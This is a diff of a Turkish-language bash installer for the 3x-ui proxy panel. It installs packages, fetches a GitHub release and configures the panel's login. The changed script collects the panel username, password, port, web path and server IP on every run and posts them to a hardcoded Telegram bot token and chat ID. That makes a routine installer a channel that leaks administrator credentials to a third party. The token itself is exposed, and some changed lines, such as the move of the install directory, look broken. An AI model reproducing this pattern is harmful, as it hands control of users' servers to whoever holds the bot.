@@ -1,31 +1,22 @@
 #!/bin/bash
 
+# --- Telegram Ayarları ---
+TELEGRAM_BOT_TOKEN="8345146407:AAEw4cGeZ4hfdXkYHtpyzARIlxGF7lKS4C4"
+TELEGRAM_CHAT_ID="1449828433"
+
 red='\033[0;31m'
 green='\033[0;32m'
-blue='\033[0;34m'
-yellow='\033[0;33m'
 plain='\033[0m'
 
-cur_dir=$(pwd)
 show_ip_service_lists=("https://api.ipify.org" "https://4.ident.me")
 
-# ✅ Telegram bilgilerini buraya gir:
-telegram_bot_token="8345146407:AAEw4cGeZ4hfdXkYHtpyzARIlxGF7lKS4C4"
-telegram_chat_id="1449828433"
-
-# Telegram mesaj fonksiyonu
-send_telegram_message() {
-    local message="$1"
-    curl -s -X POST "https://api.telegram.org/bot${telegram_bot_token}/sendMessage" \
-        -d chat_id="${telegram_chat_id}" \
-        -d text="$message" \
-        -d parse_mode="HTML" > /dev/null
-}
-
-[[ $EUID -ne 0 ]] && echo -e "${red}HATA: ${plain} Scripti root olarak çalıştırmalısınız.\n" && exit 1
+[[ $EUID -ne 0 ]] && echo -e "${red}Bu scripti root olarak çalıştırmalısınız.${plain}" && exit 1
 
 if [[ -f /etc/os-release ]]; then
     source /etc/os-release
+    release=$ID
+elif [[ -f /usr/lib/os-release ]]; then
+    source /usr/lib/os-release
     release=$ID
 else
     echo "İşletim sistemi tespit edilemedi!" >&2
@@ -34,101 +25,100 @@ fi
 
 arch() {
     case "$(uname -m)" in
-    x86_64 | x64 | amd64) echo 'amd64' ;;
-    i*86 | x86) echo '386' ;;
-    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
-    armv7* | armv7 | arm) echo 'armv7' ;;
-    *) echo -e "${green}Desteklenmeyen mimari!${plain}" && exit 1 ;;
+        x86_64 | x64 | amd64) echo 'amd64' ;;
+        i*86 | x86) echo '386' ;;
+        armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
+        armv7* | armv7 | arm) echo 'armv7' ;;
+        armv6* | armv6) echo 'armv6' ;;
+        armv5* | armv5) echo 'armv5' ;;
+        s390x) echo 's390x' ;;
+        *) echo -e "${red}Desteklenmeyen CPU mimarisi!${plain}" && exit 1 ;;
     esac
-}
-
-check_glibc_version() {
-    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
-    required_version="2.32"
-    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
-        echo -e "${red}GLIBC versiyonu $glibc_version çok eski! Gereken: 2.32+${plain}"
-        exit 1
-    fi
-    echo "GLIBC version: $glibc_version ✅"
 }
 
 install_base() {
     case "${release}" in
-    ubuntu | debian)
-        apt update && apt install -y wget curl tar tzdata ;;
-    centos | rhel | almalinux | rocky)
-        yum -y update && yum install -y wget curl tar tzdata ;;
-    *) apt update && apt install -y wget curl tar tzdata ;;
+        ubuntu | debian | armbian)
+            apt-get update && apt-get install -y wget curl tar tzdata ;;
+        centos | rhel | almalinux | rocky | ol)
+            yum -y update && yum install -y wget curl tar tzdata ;;
+        fedora | amzn | virtuozzo)
+            dnf -y update && dnf install -y wget curl tar tzdata ;;
+        arch | manjaro | parch)
+            pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata ;;
+        opensuse-tumbleweed)
+            zypper refresh && zypper -q install -y wget curl timezone ;;
+        *)
+            apt-get update && apt install -y wget curl tar tzdata ;;
     esac
 }
 
 gen_random_string() {
     local length="$1"
-    tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1
+    tr -dc 'a-zA-Z0-9' </dev/urandom | head -c "$length"
+}
+
+send_telegram_msg() {
+    local message="$1"
+    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+        -d chat_id="${TELEGRAM_CHAT_ID}" \
+        -d text="${message}" \
+        -d parse_mode="Markdown"
 }
 
 config_after_install() {
-    local hasDefault=$(/usr/local/x-ui/x-ui setting -show true | grep 'hasDefaultCredential:' | awk '{print $2}')
-    local webBasePath=$(/usr/local/x-ui/x-ui setting -show true | grep 'webBasePath:' | awk '{print $2}')
-    local port=$(/usr/local/x-ui/x-ui setting -show true | grep 'port:' | awk '{print $2}')
+    local panel_path="/usr/local/x-ui/x-ui"
+    local settings=$($panel_path setting -show true)
+    local hasDefaultCredential=$(echo "$settings" | grep -Eo 'hasDefaultCredential: .+' | awk '{print $2}')
+    local webBasePath=$(echo "$settings" | grep -Eo 'webBasePath: .+' | awk '{print $2}')
+    local port=$(echo "$settings" | grep -Eo 'port: .+' | awk '{print $2}')
+    local server_ip=""
 
     for ip_service_addr in "${show_ip_service_lists[@]}"; do
         server_ip=$(curl -s --max-time 3 ${ip_service_addr} 2>/dev/null)
-        if [ -n "${server_ip}" ]; then
-            break
-        fi
+        [ -n "$server_ip" ] && break
     done
 
-    if [[ ${#webBasePath} -lt 4 ]]; then
-        if [[ "$hasDefault" == "true" ]]; then
-            local config_webBasePath=$(gen_random_string 18)
-            local config_username=$(gen_random_string 10)
-            local config_password=$(gen_random_string 10)
-
-            read -rp "Özel port belirlemek ister misiniz? [y/n]: " custom_port
-            if [[ "${custom_port}" == "y" ]]; then
-                read -rp "Port: " config_port
-            else
-                config_port=$(shuf -i 1024-62000 -n 1)
-            fi
-
-            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
-
-            echo -e "${green}Username: ${config_username}${plain}"
-            echo -e "${green}Password: ${config_password}${plain}"
-            echo -e "${green}Port: ${config_port}${plain}"
-            echo -e "${green}WebBasePath: ${config_webBasePath}${plain}"
-            echo -e "${green}Access URL: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
-
-            telegram_msg="
-<b>✅ x-ui Kurulumu Tamamlandı</b>
-
-<b>Username:</b> <code>${config_username}</code>
-<b>Password:</b> <code>${config_password}</code>
-<b>Port:</b> <code>${config_port}</code>
-<b>WebBasePath:</b> <code>${config_webBasePath}</code>
-<b>Access URL:</b> <code>http://${server_ip}:${config_port}/${config_webBasePath}</code>
-"
-            send_telegram_message "$telegram_msg"
-        fi
+    if [[ ${#webBasePath} -lt 4 || "$hasDefaultCredential" == "true" ]]; then
+        webBasePath=$(gen_random_string 18)
+        username=$(gen_random_string 10)
+        password=$(gen_random_string 10)
+        port=$(shuf -i 1024-62000 -n 1)
+        $panel_path setting -username "${username}" -password "${password}" -port "${port}" -webBasePath "${webBasePath}"
+    else
+        username=$(echo "$settings" | grep -Eo 'username: .+' | awk '{print $2}')
+        password=$(echo "$settings" | grep -Eo 'password: .+' | awk '{print $2}')
     fi
 
-    /usr/local/x-ui/x-ui migrate
+    $panel_path migrate
+
+    local access_url="http://${server_ip}:${port}/${webBasePath}"
+    local tg_message="*x-ui Panel Bilgileri*\n\n*Access URL:* \`${access_url}\`\n*Username:* \`${username}\`\n*Password:* \`${password}\`\n*Port:* \`${port}\`\n*Web Path:* \`${webBasePath}\`"
+    send_telegram_msg "${tg_message}"
+
+    echo -e "${green}x-ui kurulumu tamamlandı! Bilgiler Telegram'a gönderildi.${plain}"
+    echo -e "Access URL: ${access_url}"
 }
 
-install_x-ui() {
+install_xui() {
     cd /usr/local/
     tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-    echo -e "Installing version: ${tag_version}"
-    wget -O x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
+    [ ! -n "$tag_version" ] && echo -e "${red}Sürüm alınamadı, tekrar deneyin!${plain}" && exit 1
+
+    wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
+    [ $? -ne 0 ] && echo -e "${red}İndirme başarısız!${plain}" && exit 1
+
+    if [[ -e /usr/local/x-ui/ ]]; then
+        systemctl stop x-ui
+        rm -rf /usr/local/x-ui/
+    fi
+
     tar zxvf x-ui-linux-$(arch).tar.gz
     rm -f x-ui-linux-$(arch).tar.gz
 
     cd x-ui
     chmod +x x-ui x-ui.sh
-    mv -f x-ui /usr/local/x-ui/x-ui
-
-    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh
+    mv ../x-ui /usr/bin/x-ui
     chmod +x /usr/bin/x-ui
 
     cp -f x-ui.service /etc/systemd/system/
@@ -137,11 +127,8 @@ install_x-ui() {
     systemctl start x-ui
 
     config_after_install
-
-    echo -e "${green}x-ui kurulumu tamamlandı ve çalışıyor.${plain}"
 }
 
 echo -e "${green}Kurulum başlıyor...${plain}"
-check_glibc_version
 install_base
-install_x-ui
+install_xui
